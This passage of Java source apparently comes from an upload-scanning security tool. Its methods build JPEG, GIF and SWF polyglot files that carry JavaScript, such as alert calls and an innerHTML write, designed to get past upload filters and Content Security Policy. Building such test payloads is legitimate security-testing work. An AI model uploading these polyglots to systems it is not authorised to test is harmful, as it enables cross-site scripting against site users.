        };
    }

    /**
     * Authentic PortSwigger JPEG + JS CSP Polyglot ported from UploadScanner.py.
     */
    public static byte[] createJpegCspPolyglot() {
        String baseB64 = "/9j/4Ak6SkZJRi8qAQEASABI" +
                "A".repeat(3096) +
                "Ki89YWxlcnQoIkJ1cnAgcm9ja3MuIik7Lyr/2wBDAB4UFhoWEx4aGBohHx4jLEowLCkpLFtBRDZKa15xb2leaGZ2haqQdn6hgGZolMqWobC1v8C/c4" +
                "7R4M+53qq7v7f/2wBDAR8hISwnLFcwMFe3emh6t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7f/wAARCABE" +
                "AEQDAREAAhEBAxEB/8QAGgAAAwEBAQEAAAAAAAAAAAAAAAIEBQMGAf/EADEQAAEDAgEKBQQDAQAAAAAAAAEAAgMEEZEFEhMhMTNBUVKBFBUiU9EyYX" +
                "GhNEJzsf/EABgBAQEBAQEAAAAAAAAAAAAAAAADBAEC/8QAHxEBAAICAwEBAQEAAAAAAAAAAAEDAhESMTITIVFB/9oADAMBAAIRAxEAPwCfSye4/FAa" +
                "WT3H4oDSye4/FB2pJJDVwgvcRnt4/dBq5ScWujsSNR2FQunpopiJ2kD39TsVn3K+oMHu6jim5NQYPd1HFc3JqF9GSYdZvrWqnyy2+nmlZIIBBs5Mox" +
                "Tx+Jn1OtcA/BR8pM6/XYjc6hyqJzPJnbGjYFjzy5S24YcY0QKb0YIGC4L6Lc91rp8sl3p5tWSCDSyVQ6RwnlHoH0g8Sg61tVpn5jD6B+1msz3+Q11" +
                "V8Y3PaYKKxwuOGCBguC+i3Pda6fLJd6ebVkjQ6PSN02dmX15u0oNhuV6VrQ1scgAFgA0fKBo8qU0kjWNjku4gC7Rx7po2MpgB0dhwKz3f400dSkCzr" +
                "mCBguC+i3Pda6fLJd6ebVkggEHWj/lwf6N/6gNrKEb5HMzGl1gb2ChbjM60vTlEb2lFPN7bsFHhl/F+eP9Do3sF3NIH3C8zjMdkZRPQC8vS+i3Pda" +
                "6fLJd6ebVkggEDRPMUrJALlrg634QaPnUnssxQaUErzT6WdojO23ILkzERuXYiZnUIZ5jM+51AbAsWefKWzDDjBQvD2votz3WunyyXenm1ZIIBAINL" +
                "JVDnkVEo9A+kHj90FFXUaV2a0+gftZLM+U6jprrw4xue3AKSpguC+i3Pda6fLJd6ebVkggEHSnYJKiJjtbXPAOKDbr5DFGyJgzWkcOXJRuymI0vTjE" +
                "zuUIWVpMEDBcF9Fue610+WS70z/LIeqTEfCskPLIeqTEfCA8sh6pMR8IHhydEyZjw592uBFyOf4QW1UDZi0uJFuSnnjGXatec49OHg4+bsVP5Qp9ZN" +
                "4SPm7Fc+UOfWX3wrObk+UH1lRAwRssL2vxVsMYxjUJKi8vL//Z";
        return Base64.getDecoder().decode(baseB64);
    }

    /**
     * Authentic ThinkFu GIF89a + JS CSP Polyglot ported from UploadScanner.py.
     */
    public static byte[] createGifCspPolyglot() {
        String baseB64 = "R0lGODlhPSAnIKUkAAAAACgAAFkAAGRkZICAgI6OjpaWlpmZmaoAAKqqqrwAAL+/v8YAAMvLy8wAANQAANsAANsxMd7e3t8/P+JRUeNbW+Zqaufn5+h" +
                "7e+uHh+uKiu2UlPGrq/KxsfS+vvTDw/fNzfnc3Prh4f39/f" + "/".repeat(111) +
                "yH+Jztkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgianNvdXRwdXQiKS5pbm5lckhUTUwgPSAiVGhpbmtGdSByZWNrb25zIENhamEgaXMgcmF0aGVyIG5" +
                "lYXQuIjsgLyogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAQgICAgACwAAAAAjwBYAAAG/" +
                "sCRcEgsGo/IpHLJbDqfxod0Cq1ar9isVjjtSrfgsHiM9HrJ6LTaaTav33B12x2v27Pz7n3Pb+b1fYGCQ1QjbYOIfYBchYmOdY2PknuLk5ZxlZeaaZm" +
                "bnmBnn6KgnaOmT6Wnqkqhq65Lra+yUamzr7G2s3S5tru8sr6/rrjCqsHFp8fIo8rLn83Om9BQANXW19jYRtZaIhUdIGvcWIdb2efoAETaVxMR7xEYa" +
                "exW5Vnp+OznVhgV/v4URJDZV4+YlXwI1Y0g+KSBhQwQI3IYmO3KNCcJ8wlh6GSBhg4gQ3qgSA/VxSYZ0w3h2OTCxBAwRYQjea2gwYMpS7J0smFI/og" +
                "OaHYysRe0ohKW1Zp8ECLwiMJtT5EI3VjmJJapKyuqvEIPnVSjRUoyqgUG68acSaGOy1oTodqaYcEasnpVrlO0adfpxBt1oV2vhOhytfsWrd69fA/DP" +
                "cvxD9Gxke6KLZxT8Vq/idkuxkfEMbHHlPuGzmg5L+bMp8dxDuw58tybmi9LBrs6tenVtffVhlxoDi3YjBd/JQzYdtTisdcaLlIOtO+jhONONv6Uo9D" +
                "ilX8Dcn7SrPHZm+VeZ5iyaijuwIPLDg1eufjo2BOa3/74OfTppUVTT34cPnnS2vV2DGjt6ZdfgdW9N1188gX4xWudEMjefcLxlyBiFarnHoCd/rlhH" +
                "2+uFbjEeLQpmOF+GqqzFWt6oEfWgRSuh+J3/CFYI3VR0VGfhBMmQWJXJsrIIFyrNedLHoH5GB2M0gGJoZD/OWnUIR8i+ZqS+N3YZHhPmmahljhCSAV" +
                "RVoYIpoijgfkjlxWmo+ObSJLl3ZobCkdnXkihA2ecf4y45JkpXminfyVOdk4Au/QpZno0YnmibUw2umV/C2IjQKL2WclElpY56qWhj0La6XDVKHDkZ" +
                "4xK94SMcSk53KYGsqrXotEY08oBBwyB6wi49rrrr7nWismtvBarqxC/HhussGvs0iuvuxoLbK7PMttsJdRGiyyy1CprrRyxPFttsNNK+y0aUoKdy0e" +
                "66t6RaruKvAhvIO/O66689lJiZr6C4MuvHf7+C0fAAr9BcMHgPoDwvZHsu/AYRj748LWOTTywZxYbXHHGFH/IMbqafpxwvSKTc3AYQQAAIf4qLyAvL" +
                "yAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgBCAgICAAOw==";
        return Base64.getDecoder().decode(baseB64);
    }

    /**
     * Minimal SWF binary header with ActionScript snippet.
     */
    public static byte[] createSwfPayload(String token) {
        String script = "getURL('javascript:alert(\"" + token + "\")');";
        byte[] scriptBytes = script.getBytes(StandardCharsets.US_ASCII);
        byte[] header = new byte[] {
                'F', 'W', 'S', 0x0A,
                (byte) (scriptBytes.length + 32), 0x00, 0x00, 0x00,
                0x78, 0x00, 0x05, 0x5F, 0x00, 0x00, 0x0F, (byte) 0xA0, 0x00,
                0x00, 0x18, 0x01, 0x00
        };
        byte[] swf = new byte[header.length + scriptBytes.length];
        System.arraycopy(header, 0, swf, 0, header.length);
        System.arraycopy(scriptBytes, 0, swf, header.length, scriptBytes.length);
        return swf;
    }
}
